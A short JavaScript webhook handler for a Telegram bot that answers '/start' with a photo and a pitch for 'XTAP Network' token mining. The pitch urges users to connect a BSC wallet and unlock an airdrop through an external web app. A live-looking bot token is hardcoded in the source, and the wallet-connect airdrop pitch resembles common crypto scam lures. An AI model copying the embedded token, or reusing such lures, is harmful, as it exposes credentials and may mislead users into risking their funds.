export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { message } = req.body;
    const BOT_TOKEN = "8925575289:AAGYb4mGFXhuUoo-_Vl3WB454ePK2Z3OIvU";

    if (message && message.text && message.text.startsWith('/start')) {
      const chatId = message.chat.id;
      const photoUrl = "https://xtap-crypto.vercel.app/coin.png";

      const payload = {
        chat_id: chatId,
        photo: photoUrl,
        caption: "👋 Welcome to XTAP Network!\n\n⛏️ Mine XTAP tokens directly to your Pool Wallet.\n⚡ Tap to boost mining speed!\n🔗 Connect your BSC (BEP-20) wallet.\n💰 Complete operations to unlock Airdrop!\n\nClick below to start.",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🚀 Start XTAP Mining", web_app: { url: "https://xtap-crypto.vercel.app/" } }],
            [{ text: "🌐 Community", url: "https://t.me/Cryptotapxofficial" }]
          ]
        }
      };

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }
    return res.status(200).send('OK');
  }
  return res.status(200).send('Bot is active');
}
